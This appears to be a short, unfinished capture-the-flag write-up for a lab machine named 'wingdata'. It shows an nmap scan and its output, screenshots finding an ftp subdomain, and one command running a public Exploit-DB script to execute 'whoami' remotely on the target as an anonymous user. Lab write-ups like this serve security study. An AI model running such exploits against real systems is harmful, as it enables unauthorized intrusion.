# wingdata

---

## Nmap scan 

```
nmap -sCV 10.129.50.126
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 18:14 EDT
Nmap scan report for 10.129.50.126
Host is up (0.091s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.99 seconds

```

## when open website found :

<img width="1919" height="573" alt="image" src="https://github.com/user-attachments/assets/3dbee8b3-1fea-4797-894e-36ccbd5b5a0a" />

## when click **`client portal`** found there is subdomain call **`ftp`**

<img width="1919" height="683" alt="image" src="https://github.com/user-attachments/assets/56a0618a-9bd7-4a53-b5ec-94a860399387" />


## when search on [exploit](https://www.exploit-db.com/exploits/52347) on it found 

<img width="1919" height="922" alt="image" src="https://github.com/user-attachments/assets/99a7ed01-fd26-42eb-995f-bd04bc484a46" />


```
python3 52347.py -u http://ftp.wingdata.htb -U anonymous -c "whoami"
```

<img width="1287" height="250" alt="image" src="https://github.com/user-attachments/assets/76183a3a-10b7-4136-9fdd-119b2cc8f9c5" />












































